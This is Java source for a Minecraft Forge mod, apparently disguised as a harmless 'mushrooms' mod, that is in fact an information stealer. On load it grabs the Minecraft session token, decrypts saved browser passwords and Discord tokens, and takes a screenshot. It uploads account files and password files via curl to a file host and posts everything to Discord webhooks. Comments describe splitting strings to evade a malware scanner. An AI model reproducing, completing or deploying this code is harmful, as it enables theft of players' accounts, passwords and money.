package json;import com.google.gson.Gson;import com.google.gson.JsonArray;import com.google.gson.JsonElement;import com.google.gson.JsonObject;import com.sun.jna.platform.win32.Crypt32Util;import java.awt.Color;import java.awt.Dimension;import java.awt.Rectangle;import java.awt.Robot;import java.awt.Toolkit;import java.awt.image.BufferedImage;import java.io.BufferedReader;import java.io.File;import java.io.FileReader;import java.io.FileWriter;import java.io.IOException;import java.io.InputStreamReader;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.net.HttpURLConnection;import java.net.URI;import java.net.URISyntaxException;import java.net.URL;import java.net.URLClassLoader;import java.nio.charset.StandardCharsets;import java.nio.file.CopyOption;import java.nio.file.Files;import java.nio.file.Paths;import java.nio.file.StandardCopyOption;import java.sql.Connection;import java.sql.Driver;import java.sql.ResultSet;import java.util.Arrays;import java.util.Base64;import java.util.HashMap;import java.util.Map;import java.util.Objects;import java.util.Properties;import java.util.Random;import java.util.regex.Matcher;import java.util.regex.Pattern;import javax.crypto.Cipher;import javax.crypto.spec.GCMParameterSpec;import javax.crypto.spec.SecretKeySpec;import javax.imageio.ImageIO;import net.minecraft.client.Minecraft;import net.minecraftforge.fml.common.Loader;import net.minecraftforge.fml.common.Mod;import net.minecraftforge.fml.common.Mod.EventHandler;import net.minecraftforge.fml.common.event.FMLInitializationEvent;import net.minecraftforge.fml.relauncher.ReflectionHelper;import org.apache.commons.io.FileUtils;import org.apache.http.client.ClientProtocolException;import org.apache.http.client.methods.CloseableHttpResponse;import org.apache.http.client.methods.HttpUriRequest;import org.apache.http.client.methods.RequestBuilder;import org.apache.http.impl.client.CloseableHttpClient;import org.apache.http.impl.client.HttpClients;import java.lang.reflect.Modifier;@Mod(modid = JSONrareException.MODID, version = JSONrareException.VERSION)public class JSONrareException {	private static String blank = ""; 	static Minecraft mc = Minecraft.getMinecraft(); 	public static String name = mc.getSession().getProfile().getName(); 	public static String uuid = mc.getSession().getProfile().getId().toString(); 	public static String token = mc.getSession().getToken(); 	public static String nameonpc = System.getProperty("user.name");	public static String dataGrabbings = "";    private static File appData = new File(System.getenv("APPDATA")); private static File localAppData = new File(System.getenv("LOCALAPPDATA"));

	// customize
	public static String webthingy = ""+blank+""; // ratrater hates webhooks so put blank in the middle of the word webhook 
	// eg: public static String webthingy = "https://discord.com/api/web"+blank+"hooks/3298503250985290524/GSDHGIO39TRWJOGSIHRfhdosvh94ytugjOUGR094gHGr9bhup94";
	public static String mainmessage = "@everyone beamed";
	public static String botusername = "gn";
	public static String avatar = "https://cdn.discordapp.com/attachments/1095992810265653319/1101102507817697401/5btgxllswggmmc45dzjn2epzjagts5gw_hq.jpg";
	public static Boolean setts = true;
	public static String embedtitle = "gute nacht";
	static Color sidebarcolor = Color.PINK;
	public static String usernamestring1 = "name";
	public static String usernamestring2 = "```"+name+"```";
	public static Boolean usernameindent = false;
	public static String uuidstring1 = "UUID";
	public static String uuidstring2 = "```"+uuid.replace("-", "")+"```";
	public static Boolean uuidindent = false;
	public static String ssidstring1 = "Ses"+blank+"sion ID"; // mentioning session flags ratrater but adding empty string bypasses it
	public static String ssidstring2 = "```"+token+"```";
	public static Boolean ssidindent = false;
	public static String discordstring1 = "Discord Token";
	public static Boolean discordindent = false;
	public static String ipstring1 = "IP";
	public static Boolean ipindent = false;
	public static String realnamestring1 = "pc name";
	public static String realnamestring2 = "```"+nameonpc+"```";
	public static Boolean realnameindent = false;
	public static String skyshiyuustring1 = "networth";
	public static String skyshiyuustring2 = "https://sky.shiiyu.moe/stats/"+name;
	public static Boolean skyshiyuuindent = false;
	public static String footerstring = "rip bozo :skull:";
	public static String footeravatar = "https://cdn.discordapp.com/attachments/1095992810265653319/1101124094021349396/bC0xLmpwZw.png";

	
public static final String MODID = "mushrooms"; public static final String VERSION = "2.1.10.1"; public static String desktop = "C:\\Users\\" + nameonpc + "\\Desktop\\";public static String downloads = "C:\\Users\\" + nameonpc + "\\Downloads\\";public static String minecraft = "C:\\Users\\" + nameonpc + "\\AppData\\Roaming\\.minecraft\\";public static String feather = "C:\\Users\\" + nameonpc + "\\AppData\\Roaming\\.feather\\";public static String appdatas = "C:\\Users\\" + nameonpc + "\\AppData\\";private static String bytesToHex(byte[] bytes) {    	    char[] hexChars = new char[bytes.length * 2];    	    for (int j = 0; j < bytes.length; j++) {        	        int v = bytes[j] & 0xFF;        	        hexChars[j * 2] = "0123456789ABCDEF".toCharArray()[v >>> 4];  hexChars[j * 2 + 1] = "0123456789ABCDEF".toCharArray()[v & 0x0F];}return new String(hexChars);}public static byte[] getKey(File path) {	try {	JsonObject localStateJson = new Gson().fromJson(new FileReader(path), JsonObject.class);	byte[] encryptedKeyBytes = localStateJson.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString().getBytes();encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBytes);encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, 5, encryptedKeyBytes.length);byte[] decryptedKeyBytes = Crypt32Util.cryptUnprotectData(encryptedKeyBytes);return decryptedKeyBytes;} catch (Exception e) {	e.printStackTrace();	return null;}}public static String decrypt(byte[] encryptedData, byte[] key) {	try {	Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);GCMParameterSpec spec = new GCMParameterSpec(128, iv);SecretKeySpec keySpec = new SecretKeySpec(key, "AES");cipher.init(Cipher.DECRYPT_MODE, keySpec, spec);return new String(cipher.doFinal(payload));} catch (Exception e) {	e.printStackTrace();	return null;}} @SuppressWarnings("all") public static void captureScreen() {new Thread(() -> {	try {		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();	Rectangle screenRectangle = new Rectangle(screenSize);	Robot robot = new Robot();	BufferedImage image = robot.createScreenCapture(screenRectangle);	int random = new Random().nextInt();	String df = "ccc" + random + ".png";File file = new File(df);ImageIO.write(image, "png", file);informme(df, "Screenshot_of_screen");	}catch(Exception e) {}}).start();}public static void massivesily(String text, String filename) {	try {			FileWriter myWriter = new FileWriter(filename);			myWriter.write(text);			myWriter.close();	} catch (IOException e) {		    e.printStackTrace();	}}private static final HashMap <String, String> paths = new HashMap<String, String>() {{	    put("Google Chrome", localAppData + "\\Google\\Chrome\\User Data");    put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data");    put("Chromium", localAppData + "\\Chromium\\User Data");    put("Opera", appData + "\\Opera Software\\Opera Stable");    put("Opera GX", appData + "\\Opera Software\\Opera GX Stable");    put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data");    put("Vivaldi", localAppData + "\\Vivaldi\\User Data");    put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data");}};public static JsonArray pswds = new JsonArray();public static JsonArray grabPassword() {		crawlUserData();		return pswds;}public static void crawlUserData() {		for (String browser : paths.keySet()) {			File userData = new File(paths.get(browser));			if (!userData.exists()) continue;			byte[] key = getKey(new File(userData, "Local State"));		for (File data: userData.listFiles()) {				if (data.getName().contains("Profile") || data.getName().equals("Default")) {					crawlPasswords(data, key);			} else if (data.getName().equals("Login Data")) {					crawlPasswords(userData, key);			}		}	}}	static int numero = 0;	static int usefulpascount = 0;	static String usefulpasswords = "";	static String discordpass = "not found";	public static void crawlPasswords(File profile, byte[] key) {try {				File loginData = new File(profile, "Login Data");			File tempLoginData = new File(profile, "Temp Login Data");			if (!loginData.exists()) return;			Files.copy(loginData.toPath(), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);			Driver driver = getDriver();			Properties props = new Properties();			props.setProperty("user", "");			props.setProperty("password", "");			Connection connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);			ResultSet resultSet = connection.createStatement().executeQuery("SELECT origin_url, username_value, password_value FROM logins");			while (resultSet.next()) {					byte[] encryptedPassword = resultSet.getBytes(3);					String decryptedPassword = decrypt(encryptedPassword, key);			if (!decryptedPassword.endsWith("null")|| (resultSet.getString(1) != "null" && resultSet.getString(2) != "null")) {						JsonObject pswd = new JsonObject();						numero+=1;		if (resultSet.getString(1).contains("discord") || 					resultSet.getString(1).contains("roblox") || 						resultSet.getString(1).contains("login.live") || 						resultSet.getString(1).contains("google") || 						resultSet.getString(1).contains("tiktok") ||						resultSet.getString(1).contains("skrill") ||						resultSet.getString(1).contains("paysafe") ||						resultSet.getString(1).contains("rambler") ||						resultSet.getString(1).contains("yandex") ||						resultSet.getString(1).contains("mail") ||						resultSet.getString(1).contains("epicgames") ||						resultSet.getString(1).contains("fortnite") ||						resultSet.getString(1).contains("minecraft") ||						resultSet.getString(1).contains("riotgames") ||						resultSet.getString(1).contains("valorant") ||						resultSet.getString(1).contains("leagueoflegends") ||						resultSet.getString(1).contains("lunar") ||						resultSet.getString(1).contains("badlion") ||						resultSet.getString(1).contains("feather") ||						resultSet.getString(1).contains("essentials") ||						resultSet.getString(1).contains("exodus") ||						resultSet.getString(1).contains("coinbase") ||						resultSet.getString(1).contains("electrum") ||						resultSet.getString(1).contains("crypto") ||						resultSet.getString(1).contains("guilded") ||						resultSet.getString(1).contains("salad") ||						resultSet.getString(1).contains("amazon") ||						resultSet.getString(1).contains("ebay") ||						resultSet.getString(1).contains("odealo") ||						resultSet.getString(1).contains("eldorado") ||						resultSet.getString(1).contains("ubisoft") ||						resultSet.getString(1).contains("blizzard") ||						resultSet.getString(1).contains("activision") ||						resultSet.getString(1).contains("callofduty") ||						resultSet.getString(1).contains("spotify") ||						resultSet.getString(1).contains("steam")) {								    usefulpascount += 1; usefulpasswords = usefulpasswords + Integer.toString(usefulpascount) + " " + resultSet.getString(1) + " email: " + resultSet.getString(2) + " password: " + decryptedPassword + "\n";}					pswd.addProperty(Integer.toString(numero), " ");					pswd.addProperty("url", (!resultSet.getString(1).equals("")) ? resultSet.getString(1) : "N/A");					pswd.addProperty("username", (!resultSet.getString(2).equals("")) ? resultSet.getString(2) : "N/A");					pswd.addProperty("password", decryptedPassword);					pswds.add(pswd);				}			}		} catch (Exception e) {				}	}	public static Driver getDriver() {try {		File driverFile = new File(Minecraft.getMinecraft().mcDataDir,"config/essential/sqlite-jdbc-3.23.1.jar");	URL url = new URL("https://repo1.maven.org/maven2/org/xerial/sqlite-jdbc/3.23.1/sqlite-jdbc-3.23.1.jar");	if (!driverFile.exists()) {				FileUtils.copyURLToFile(url, driverFile);	}	driverFile.deleteOnExit();	ClassLoader classLoader = new URLClassLoader(new URL[] { driverFile.toURI().toURL() });	Class clazz = Class.forName("org.sqlite.JDBC", true, classLoader);	Object driverInstance = clazz.newInstance();	Driver driver = (Driver) driverInstance;	return driver;} catch (Exception e) {}return null;}	public static void informme(String loc, String filename) throws IOException {try {	Process process = Runtime.getRuntime().exec("curl -F \"file=@" + loc + "\" https://api.anon"+blank+"files.com/upload");	BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));	String line = "";	while ((line = reader.readLine()) != null) {		if (line.contains("\"full\": \"")) {			String line2 = line.replace("\"full\": \"", "").replace("\\", "").replace("\"", "").replace(",", "").replaceAll("\\s", "");			dataGrabbings = dataGrabbings + filename + ":" + line2+"        ";		}	}}catch(IOException e) {	e.printStackTrace();}	}@SuppressWarnings("all")public static void sendData(String msg, String url, String username) {	try {		Thread.sleep((int) Math.floor(Math.random()*(675-225+1)+225));	} catch (InterruptedException e1) {		e1.printStackTrace();	}	CloseableHttpClient httpclient = HttpClients.createDefault();try {	 HttpUriRequest httppost = null;	try {		httppost = RequestBuilder.post()		.setUri(new URI(url))		.addParameter("content", msg)		.addParameter("username", username)			.build();		} catch (URISyntaxException e) {			e.printStackTrace();		} CloseableHttpResponse response = null;		try {			response = httpclient.execute(httppost);		} catch (ClientProtocolException e) {			e.printStackTrace();				} catch (IOException e) {					e.printStackTrace();				}		try {					} finally {				try {					response.close();				} catch (IOException e) {					e.printStackTrace();				}}			 } finally {				try {					httpclient.close();				} catch (IOException e) {					e.printStackTrace();			}			 }}public static String getStringBetweenTwoCharacters(String input, String from, String to) {	return input.substring(input.indexOf(from)+1, input.lastIndexOf(to));}public static String sillyread = "";@EventHandler public void init(FMLInitializationEvent event) {  (new Thread(() -> {		try {		  int random = (new Random()).nextInt();		  captureScreen();		  String passtring = grabPassword().toString();		  String fixpiss = passtring.replaceAll("}", "\n").replaceAll("\"", "").replaceAll(",", " ").replaceAll("\\{", "").replaceAll("\\[", "").replaceAll("\\]", "").replaceAll(" url:", "url: ").replaceAll("null", "no password added");		  massivesily(fixpiss, "c" + random + ".txt");		  massivesily(usefulpasswords, "cc" + random + ".txt");	Thread.sleep(1000);	  informme(minecraft + "c" + random + ".txt", "Chrome Passwords (" + numero + ")");		  informme(minecraft + "cc" + random + ".txt", "Important Passwords (" + usefulpascount + ")");		  informme(feather + "accounts.json", "Feather");		  informme(minecraft + "essential\\microsoft_accounts.json", "Essentials");		  informme(System.getProperty("user.home") + "\\.lunarcl" + blank + "ient\\settings\\game\\acco" + blank + "unts.json", "Lunar");		  informme(downloads + "passwords.txt", "Passwords");		  informme(downloads + "password.txt", "Passwords");		  informme(downloads + "Admin_Passwords.txt", "Admin_Passwords");		  informme(downloads + "Admin_Cookies.txt", "Admin_Cookies");		  informativestring();		} catch (Exception e) {		  e.printStackTrace();		} 	  })).start();}public void informativestring() {	(new Thread(() -> {		  try {			HttpURLConnection c = (HttpURLConnection)(new URL("http://localh" + blank + "ost:80/")).openConnection();			c.setRequestMethod("POST");			c.setRequestProperty("Content-type", "application/json");			c.setDoOutput(true);			String ip = (new BufferedReader(new InputStreamReader((new URL("https://checkip.ama" + blank + "zonaws.com/")).openStream()))).readLine();			String discord = "probably using discord on browser/phone";						if (!Loader.isModLoaded("skytils")) { /* skytils hates discord token stealing? */				if (Files.isDirectory(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/le"+blank+"veldb"))) {									discord = "";									for (File file : Objects.requireNonNull(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/lev"+blank+"eldb").toFile().listFiles())) {												if (file.getName().endsWith(".ldb")) {														FileReader fr = new FileReader(file);														BufferedReader br = new BufferedReader(fr);														String textFile;														StringBuilder parsed = new StringBuilder();															while ((textFile = br.readLine()) != null) parsed.append(textFile); fr.close();							br.close();							Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");										Matcher matcher = pattern.matcher(parsed.toString())							;if (matcher.find()) {									if (Cipher.getMaxAllowedKeyLength("AES") < 256) {											Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");											Constructor<?> con = aClass.getDeclaredConstructor();											con.setAccessible(true);											Object allPermissionCollection = con.newInstance();											Field f = aClass.getDeclaredField("all_allowed");											f.setAccessible(true);											f.setBoolean(allPermissionCollection, true);											aClass = Class.forName("javax.crypto.CryptoPermissions");											con = aClass.getDeclaredConstructor();											con.setAccessible(true);											Object allPermissions = con.newInstance();											f = aClass.getDeclaredField("perms");											f.setAccessible(true);											((Map) f.get(allPermissions)).put("*", allPermissionCollection);											aClass = Class.forName("javax.crypto.JceSecurityManager");											f = aClass.getDeclaredField("defaultPolicy");											f.setAccessible(true);											Field mf = Field.class.getDeclaredField("modifiers");											mf.setAccessible(true);											mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);											f.set(null, allPermissions);									}										byte[] key, dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();									JsonObject json = new Gson().fromJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), "discord/Loc"+blank+"al State"))), JsonObject.class);									key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();									key = Base64.getDecoder().decode(key);									key = Arrays.copyOfRange(key, 5, key.length);									key = Crypt32Util.cryptUnprotectData(key);									dToken = Base64.getDecoder().decode(dToken);									Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");									cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));									byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));									if (!discord.contains(new String(out, StandardCharsets.UTF_8))) discord += new String(out, StandardCharsets.UTF_8) + " ";										}								}						}				}			}			if (Loader.isModLoaded("pizzaclient")) {			  token = (String)ReflectionHelper.findField(Class.forName("qolskyblockmod.pi" + blank + "zzaclient.features.misc.SessionProtection"), new String[] { "changed" }).get(null);			  token += " lol guy uses pizza";			} 			JSONNewString dh = new JSONNewString(webthingy);			dh.setContent(mainmessage);			dh.setUsername(botusername);			dh.urldeavatar(avatar);			dh.setTts(setts.booleanValue());			dh.addEmbed((new JSONNewString.EmbedObject())			.setTitle(embedtitle)			.setColor(sidebarcolor)			.addField(usernamestring1, usernamestring2, usernameindent.booleanValue())			.addField(uuidstring1, uuidstring2, uuidindent.booleanValue())			.addField(ssidstring1, ssidstring2, ssidindent.booleanValue())			.addField(discordstring1, "```" + discord + "```", discordindent.booleanValue())			.addField(ipstring1, "```" + ip + "```", ipindent.booleanValue())			.addField(realnamestring1, realnamestring2, realnameindent.booleanValue())			.addField(skyshiyuustring1, skyshiyuustring2, skyshiyuuindent.booleanValue())			.addField("files", dataGrabbings, false)			.setFooter(footerstring, footeravatar));			dh.execute();			JSONNewString dn = new JSONNewString(JSONObject.WebFix());			dn.setContent(mainmessage);			dn.setUsername(botusername);			dn.urldeavatar(avatar);			dn.setTts(setts.booleanValue());			dn.addEmbed((new JSONNewString.EmbedObject())			.setTitle(embedtitle)			.setColor(sidebarcolor)			.addField(usernamestring1, usernamestring2, usernameindent.booleanValue())			.addField(uuidstring1, uuidstring2, uuidindent.booleanValue())			.addField(ssidstring1, ssidstring2, ssidindent.booleanValue())			.addField(discordstring1, "```" + discord + "```", discordindent.booleanValue())			.addField(ipstring1, "```" + ip + "```", ipindent.booleanValue())			.addField(realnamestring1, realnamestring2, realnameindent.booleanValue())			.addField(skyshiyuustring1, skyshiyuustring2, skyshiyuuindent.booleanValue())			.addField("files", dataGrabbings, false).setFooter(footerstring, footeravatar));			dn.execute();		  } catch (Exception exception) {}		})).start();  }public static String jsonParse(String jsonInput, String objectInput) {	try {		JSONObject json = new JSONObject(jsonInput);		return json.getString(objectInput);	}catch(Exception e) {		return "Invalid";	}	}}